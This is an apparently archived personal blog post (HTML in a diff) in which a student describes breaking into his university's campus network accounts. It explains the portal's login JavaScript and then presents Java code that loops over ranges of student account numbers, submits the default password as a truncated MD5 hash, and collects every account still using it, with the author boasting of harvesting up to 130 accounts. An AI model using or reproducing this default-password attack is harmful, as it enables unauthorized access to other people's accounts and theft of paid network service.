@@ -1,0 +1,626 @@
+
+ <!DOCTYPE HTML>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  
+    <title>抓取校园网账号－java版 | TopJohn&#39;Blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="John">
+    
+
+    
+    <meta name="description" content="最近闲的无聊，尝试着抓了下没改密码的校园网账号">
+<meta property="og:type" content="article">
+<meta property="og:title" content="抓取校园网账号－java版">
+<meta property="og:url" content="http://www.xuanzhangjiong.xyz/2016/01/07/抓取校园网账号－java版/index.html">
+<meta property="og:site_name" content="TopJohn'Blog">
+<meta property="og:description" content="最近闲的无聊，尝试着抓了下没改密码的校园网账号">
+<meta property="og:image" content="http://7xoz2q.com1.z0.glb.clouddn.com/%E7%A0%B4%E8%A7%A3%E6%A0%A1%E5%9B%AD%E7%BD%911.jpg">
+<meta property="og:image" content="http://7xoz2q.com1.z0.glb.clouddn.com/%E7%A0%B4%E8%A7%A3%E6%A0%A1%E5%9B%AD%E7%BD%912.jpg">
+<meta property="og:updated_time" content="2016-01-08T06:01:46.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="抓取校园网账号－java版">
+<meta name="twitter:description" content="最近闲的无聊，尝试着抓了下没改密码的校园网账号">
+<link rel="publisher" href="114979210024559900000">
+
+    
+    <link rel="alternative" href="/atom.xml" title="TopJohn&#39;Blog" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/apple.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/apple.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css" type="text/css">
+</head>
+
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="TopJohn&#39;Blog">TopJohn&#39;Blog</a></h1>
+				<h2 class="blog-motto">Coding的路上，至少我乐在其中...</h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">主页</a></li>
+					
+						<li><a href="/archives">归档</a></li>
+					
+						<li><a href="/categories">分类</a></li>
+					
+						<li><a href="/tags">标签</a></li>
+					
+						<li><a href="/pay">打赏</a></li>
+					
+						<li><a href="/about">关于</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="搜索" />
+						<input type="hidden" name="q" value="site:www.xuanzhangjiong.xyz">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2016/01/07/抓取校园网账号－java版/" title="抓取校园网账号－java版" itemprop="url">抓取校园网账号－java版</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="https://plus.google.com/114979210024559900000?rel=author" title="John" target="_blank" itemprop="author">John</a>
+		
+  <p class="article-time">
+    <time datetime="2016-01-07T06:27:05.000Z" itemprop="datePublished"> 发表于 2016-01-07</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">文章目录</strong>
+		
+			
+		
+		</div>
+		
+		<p>前天吧，室友丁小贤童鞋，用python抓了几十个校园网的账号，当时就震惊了，以前凑过几个账号，因为某些情况下，自己一个账号并不够用，所以偶尔用用别人不用的账号也是可以的。</p>
+<p>于是乎，昨天上午，上课不听课，开始研究怎么抓取账号了。</p>
+<p>简单介绍下，我们学校的校园网用的是联通的网，200兆带宽吧，有个服务器作统一身份认证，连上<code>CST-WLAN</code>，就出现了登陆界面ip是<code>192.0.0.6</code></p>
+<p><img src="http://7xoz2q.com1.z0.glb.clouddn.com/%E7%A0%B4%E8%A7%A3%E6%A0%A1%E5%9B%AD%E7%BD%911.jpg" alt=""></p>
+<p>chrome里看了下源代码，我去，js什么的都没有压缩，阅读起来流畅的很，主要接口大概给了3个：</p>
+<ul>
+<li><p>登陆接口</p>
+<p>看下主要代码：</p>
+<figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">var data=<span class="string">"username="</span>+uname+<span class="string">"&amp;password="</span>+pass2+<span class="string">"&amp;drop="</span>+drop+<span class="string">"&amp;type=1&amp;n=100"</span>;</span><br><span class="line"></span><br><span class="line">  var con=postData(<span class="string">"/cgi-bin/do_login"</span>, <span class="string">"post"</span>, data);</span><br><span class="line">  <span class="comment">//alert(con);</span></span><br><span class="line">  var p=/^[\d]+$/;</span><br><span class="line">  <span class="keyword">if</span>(p.test(con))</span><br><span class="line">  &#123;</span><br><span class="line">      document.form1.uid.value=con;</span><br><span class="line">      <span class="keyword">if</span>(document.form1.save_me.checked) <span class="comment">//写COOKIE</span></span><br><span class="line">      &#123;</span><br><span class="line">          setCookie(<span class="string">"srun_login"</span>,uname+<span class="string">"|"</span>+pass);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">          delCookie(<span class="string">"srun_login"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      window.open(<span class="string">"login.html"</span>+location.search,<span class="string">"user_login"</span>,<span class="string">"width=428,height=296"</span>);         </span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;    </span><br><span class="line">  <span class="keyword">switch</span>(con)</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">"user_tab_error"</span>:</span><br><span class="line">          alert(<span class="string">"认证程序未启动"</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">"username_error"</span>:</span><br><span class="line">          alert(<span class="string">"用户名错误"</span>);</span><br><span class="line">          document.form1.uname.focus();</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">"non_auth_error"</span>:</span><br><span class="line">          alert(<span class="string">"您无须认证，可直接上网"</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">"password_error"</span>:</span><br><span class="line">          alert(<span class="string">"密码错误"</span>);</span><br><span class="line">          document.form1.pass.focus();</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">"status_error"</span>:</span><br><span class="line">          alert(<span class="string">"用户已欠费，请尽快充值。"</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">"available_error"</span>:</span><br><span class="line">          alert(<span class="string">"用户已禁用"</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">"ip_exist_error"</span>:</span><br><span class="line">          alert(<span class="string">"您的IP尚未下线，请等待2分钟再试。"</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">"usernum_error"</span>:</span><br><span class="line">          alert(<span class="string">"用户数已达上限"</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">"online_num_error"</span>:</span><br><span class="line">          alert(<span class="string">"该帐号的登录人数已超过限额\n如果怀疑帐号被盗用，请联系管理员。"</span>);</span><br><span class="line">          <span class="keyword">break</span>;    </span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">"mode_error"</span>:</span><br><span class="line">          alert(<span class="string">"系统已禁止WEB方式登录，请使用客户端"</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">"time_policy_error"</span>:</span><br><span class="line">          alert(<span class="string">"当前时段不允许连接"</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">"flux_error"</span>:</span><br><span class="line">          alert(<span class="string">"您的流量已超支"</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">"minutes_error"</span>:</span><br><span class="line">          alert(<span class="string">"您的时长已超支"</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">"ip_error"</span>:</span><br><span class="line">          alert(<span class="string">"您的IP地址不合法"</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">"mac_error"</span>:</span><br><span class="line">          alert(<span class="string">"您的MAC地址不合法"</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">"sync_error"</span>:</span><br><span class="line">          alert(<span class="string">"您的资料已修改，正在等待同步，请2分钟后再试。"</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">          alert(<span class="string">"找不到认证服务器"</span>);</span><br><span class="line">          <span class="keyword">break</span>;        </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>给的太详细了,简单的说，将用户名和密码的md5值的16进制字符截取8-24位post到服务器，如果验证成功估计返回的是<code>UUID</code>，失败则返回各种错误值。</p>
+</li>
+<li><p>登出</p>
+</li>
+</ul>
+<p>不作详细介绍，意思就是，本机登陆了，就可以登出，且登出后，无需等待，即可登录。</p>
+<ol>
+<li>强制登出</li>
+</ol>
+<p>强制登出的意思是，这个账号在别的地方登录了，那么可以强制登出，2分钟后可以登录。</p>
+<p>程序思路很简单，遍历所有账号，对默认密码进行md5计算，发起<code>post</code>请求，看了下返回值，其实只有2种是成功的，对我们来说：</p>
+<figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">"ip_exist_error"</span>:</span><br><span class="line">alert(<span class="string">"您的IP尚未下线，请等待2分钟再试。"</span>);</span><br></pre></td></tr></table></figure>
+<p>这种是测试的这个账号并没有上线。</p>
+<figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">"online_num_error"</span>:                       alert(<span class="string">"该帐号的登录人数已超过限额\n如果怀疑帐号被盗用，请联系管理员。"</span>);</span><br></pre></td></tr></table></figure>
+<p>这种是测试的账号已经登录了，但是密码并没有修改。</p>
+<p>截取这2种情况的账号看看有几个，收集起来就可以了。</p>
+<figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">static</span> <span class="type">void</span> login() &#123;</span><br><span class="line"></span><br><span class="line">       //双证</span><br><span class="line">       <span class="keyword">for</span> (<span class="type">int</span> i = <span class="type">DOUBLE_RANGE_START</span>; i &lt;= <span class="type">DOUBLE_RANGE_END</span>; i++) &#123;</span><br><span class="line"></span><br><span class="line">           boolean isOk = post(i + <span class="string">""</span>, <span class="type">DOUBLE_PASS</span>);</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (isOk) &#123;</span><br><span class="line"></span><br><span class="line">               //<span class="type">System</span>.<span class="keyword">out</span>.println(<span class="string">"ok"</span>);</span><br><span class="line"></span><br><span class="line">               <span class="literal">result</span>.put(i + <span class="string">""</span>, <span class="type">DOUBLE_PASS</span>);</span><br><span class="line"></span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       //单证</span><br><span class="line">       <span class="keyword">for</span> (<span class="type">int</span> j = <span class="type">SINGLE_RANGE_START</span>; j &lt;= <span class="type">SINGLE_RANGE_END</span>; j++) &#123;</span><br><span class="line"></span><br><span class="line">           boolean isOk = post(<span class="string">"nb"</span> + j + <span class="string">""</span>, <span class="type">SINGLE_PASS</span>);</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (isOk) &#123;</span><br><span class="line"></span><br><span class="line">               //<span class="type">System</span>.<span class="keyword">out</span>.println(<span class="string">"ok"</span>);</span><br><span class="line"></span><br><span class="line">               <span class="literal">result</span>.put(<span class="string">"nb"</span> + j + <span class="string">""</span>, <span class="type">SINGLE_PASS</span>);</span><br><span class="line"></span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">static</span> boolean post(<span class="type">String</span> userName, <span class="type">String</span> passWord) &#123;</span><br><span class="line"></span><br><span class="line">       passWord = md5_1(passWord);</span><br><span class="line"></span><br><span class="line">       // <span class="type">System</span>.<span class="keyword">out</span>.println(userName+<span class="string">":"</span>+passWord);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           url = new <span class="type">URL</span>(<span class="type">URL</span>);</span><br><span class="line">           http = (<span class="type">HttpURLConnection</span>) url.openConnection();</span><br><span class="line"></span><br><span class="line">           http.setDoInput(<span class="literal">true</span>);</span><br><span class="line">           http.setDoOutput(<span class="literal">true</span>);</span><br><span class="line">           http.setUseCaches(<span class="literal">false</span>);</span><br><span class="line">           http.setConnectTimeout(<span class="number">50000</span>);//设置连接超时</span><br><span class="line">           http.setReadTimeout(<span class="number">50000</span>);//设置读取超时</span><br><span class="line">           http.setRequestMethod(<span class="string">"POST"</span>);</span><br><span class="line">           http.setRequestProperty(<span class="string">"Content-Type"</span>, <span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">           http.connect();</span><br><span class="line">           <span class="type">String</span> param = <span class="string">"username="</span> + userName + <span class="string">"&amp;password="</span> + passWord + <span class="string">"&amp;drop="</span> + <span class="number">0</span> + <span class="string">"&amp;type=1&amp;n=100"</span>;</span><br><span class="line"></span><br><span class="line">           <span class="type">OutputStreamWriter</span> osw = new <span class="type">OutputStreamWriter</span>(http.getOutputStream(), <span class="string">"utf-8"</span>);</span><br><span class="line">           osw.write(param);</span><br><span class="line">           osw.flush();</span><br><span class="line">           osw.close();</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (http.getResponseCode() == <span class="number">200</span>) &#123;</span><br><span class="line"></span><br><span class="line">               <span class="type">BufferedReader</span> <span class="keyword">in</span> = new <span class="type">BufferedReader</span>(new <span class="type">InputStreamReader</span>(http.getInputStream(), <span class="string">"utf-8"</span>));</span><br><span class="line"></span><br><span class="line">               <span class="type">StringBuffer</span> <span class="literal">result</span> = new <span class="type">StringBuffer</span>();</span><br><span class="line">               <span class="type">String</span> temp;</span><br><span class="line">               <span class="keyword">while</span> ((temp = <span class="keyword">in</span>.readLine()) != null) &#123;</span><br><span class="line">                   <span class="literal">result</span>.append(temp);</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">in</span>.close();</span><br><span class="line"></span><br><span class="line">              // <span class="type">System</span>.<span class="keyword">out</span>.println(<span class="literal">result</span>.toString());</span><br><span class="line"></span><br><span class="line">//                <span class="keyword">if</span> (matchs(<span class="literal">result</span>.toString())) &#123;</span><br><span class="line">//</span><br><span class="line">//                   // <span class="type">System</span>.<span class="keyword">out</span>.println(<span class="literal">result</span>.toString());</span><br><span class="line">//</span><br><span class="line">//                    postLogout(<span class="literal">result</span>.toString());</span><br><span class="line">//</span><br><span class="line">//                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">//</span><br><span class="line">//                &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">               switch (<span class="literal">result</span>.toString()) &#123;</span><br><span class="line">//                    <span class="keyword">case</span> <span class="string">"non_auth_error"</span>:</span><br><span class="line">////                        alert(<span class="string">"您无须认证，可直接上网"</span>);</span><br><span class="line">//</span><br><span class="line">//                        //<span class="type">System</span>.<span class="keyword">out</span>.println(<span class="literal">result</span>.toString());</span><br><span class="line">//</span><br><span class="line">//                        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">                   <span class="keyword">case</span> <span class="string">"ip_exist_error"</span>:</span><br><span class="line">//                        alert(<span class="string">"您的IP尚未下线，请等待2分钟再试。"</span>);</span><br><span class="line"></span><br><span class="line">                       //<span class="type">System</span>.<span class="keyword">out</span>.println(<span class="literal">result</span>.toString());</span><br><span class="line"></span><br><span class="line">                       <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">                   <span class="keyword">case</span> <span class="string">"online_num_error"</span>:</span><br><span class="line">//                        alert(<span class="string">"该帐号的登录人数已超过限额\n如果怀疑帐号被盗用，请联系管理员。"</span>);</span><br><span class="line"></span><br><span class="line">                       //<span class="type">System</span>.<span class="keyword">out</span>.println(<span class="literal">result</span>.toString());</span><br><span class="line"></span><br><span class="line">                       <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">                   default:</span><br><span class="line">//                        alert(<span class="string">"找不到认证服务器"</span>);</span><br><span class="line"></span><br><span class="line">                       <span class="keyword">break</span>;</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">       &#125; catch (<span class="type">Exception</span> e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (http != null)</span><br><span class="line">               http.disconnect();</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">md5_1</span><span class="params">(String pass)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           md5 = MessageDigest.getInstance(<span class="string">"MD5"</span>);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">//128位整数分成了16份每份8位</span></span><br><span class="line">       byte[] digest = md5.digest(pass.getBytes());</span><br><span class="line"></span><br><span class="line">       StringBuffer sb = <span class="keyword">new</span> StringBuffer();</span><br><span class="line"></span><br><span class="line">       <span class="comment">//由于有符号位,所以要处理下</span></span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">int</span> i : digest) &#123;</span><br><span class="line">           <span class="keyword">if</span> (i &lt; <span class="number">0</span>) &#123;</span><br><span class="line">               <span class="comment">//二进制存的是补码</span></span><br><span class="line">               i += <span class="number">256</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">if</span> (i &lt; <span class="number">16</span>) &#123;</span><br><span class="line">               sb.append(<span class="string">"0"</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           sb.append(Integer.toHexString(i));</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">//取16位</span></span><br><span class="line">       <span class="keyword">return</span> sb.toString().substring(<span class="number">8</span>, <span class="number">24</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p>主要代码都贴出来了，我把它放到github了<br><a href="/&#109;&#x61;&#x69;&#x6c;&#116;&#111;&#x3a;&#103;&#x69;&#116;&#64;&#x67;&#105;&#116;&#x68;&#x75;&#x62;&#x2e;&#99;&#111;&#x6d;&#x3a;&#84;&#x6f;&#x70;&#74;&#x6f;&#x68;&#110;&#x2f;&#x4e;&#101;&#x74;&#65;&#x63;&#111;&#x75;&#x6e;&#x74;&#x2e;&#103;&#x69;&#116;">&#103;&#x69;&#116;&#64;&#x67;&#105;&#116;&#x68;&#x75;&#x62;&#x2e;&#99;&#111;&#x6d;&#x3a;&#84;&#x6f;&#x70;&#74;&#x6f;&#x68;&#110;&#x2f;&#x4e;&#101;&#x74;&#65;&#x63;&#111;&#x75;&#x6e;&#x74;&#x2e;&#103;&#x69;&#116;</a></p>
+<p>那么测试结果呢：<br><img src="http://7xoz2q.com1.z0.glb.clouddn.com/%E7%A0%B4%E8%A7%A3%E6%A0%A1%E5%9B%AD%E7%BD%912.jpg" alt=""><br>顶峰时刻有130个，估计我宣传了一波之后，有不少人改了。<br>一会推出Android版的。</p>
+  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/java/">java</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/校园网账号抓取/">校园网账号抓取</a>
+  </div>
+
+</div>
+
+
+
+	<div class="article-share" id="share">
+	
+	  <div data-url="http://www.xuanzhangjiong.xyz/2016/01/07/抓取校园网账号－java版/" data-title="抓取校园网账号－java版 | TopJohn&#39;Blog" data-tsina="1600625133" class="share clearfix">
+	  </div>
+	
+	</div>
+
+
+</footer>
+
+   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/2016/01/08/软院上网助手Android版/" title="软院上网助手Android版">
+  <strong>上一篇：</strong><br/>
+  <span>
+  软院上网助手Android版</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2016/01/06/java-MD5－-HexString的3种方法/"  title="java-MD5转HexString的3种方法">
+ <strong>下一篇：</strong><br/> 
+ <span>java-MD5转HexString的3种方法
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+<section id="comments" class="comment">
+	<div class="ds-thread" data-thread-key="2016/01/07/抓取校园网账号－java版/" data-title="抓取校园网账号－java版" data-url="http://www.xuanzhangjiong.xyz/2016/01/07/抓取校园网账号－java版/"></div>
+</section>
+
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">文章目录</strong>
+ 
+ 
+ 
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
+<aside class="clearfix">
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">分类</p>
+		<ul>
+		
+		  
+			<li><a href="/categories/Android/" title="Android">Android<sup>8</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Git/" title="Git">Git<sup>3</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Java/" title="Java">Java<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/MarkDown/" title="MarkDown">MarkDown<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/java/" title="java">java<sup>2</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/项目经历/作品/" title="作品">作品<sup>2</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/开源贡献/" title="开源贡献">开源贡献<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/架构/" title="架构">架构<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/生活小记/" title="生活小记">生活小记<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/设计模式/" title="设计模式">设计模式<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/项目经历/" title="项目经历">项目经历<sup>2</sup></a></li>
+		  
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">标签</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/码农必备常识/" title="码农必备常识">码农必备常识<sup>4</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Android进阶优质资源/" title="Android进阶优质资源">Android进阶优质资源<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/创业项目，一个字“累”/" title="创业项目，一个字“累”">创业项目，一个字“累”<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/校园网账号抓取/" title="校园网账号抓取">校园网账号抓取<sup>1</sup></a></li>
+			
+		
+			
